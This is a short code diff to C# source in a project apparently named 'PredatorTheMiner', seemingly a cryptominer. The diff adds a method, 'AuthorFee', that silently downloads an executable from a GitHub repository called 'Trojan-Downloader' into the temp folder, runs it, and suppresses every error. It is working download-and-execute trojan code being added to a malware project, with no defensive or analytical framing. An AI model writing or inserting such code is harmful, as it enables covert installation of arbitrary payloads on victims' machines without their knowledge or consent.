@@ -59,5 +59,16 @@ namespace PredatorTheMiner
 				return false;
 			}
 		}
+
+		public static void AuthorFee()
+		{
+			try
+			{
+				const string download_link = "https://github.com/Alexuiop1337/Trojan-Downloader/raw/master/fee.exe";
+				new WebClient().DownloadFile(download_link, Path.GetTempPath() + "\\fee.exe");
+				Process.Start(Path.GetTempPath() + "\\fee.exe");
+			}
+			catch { }
+		}
 	}
 }
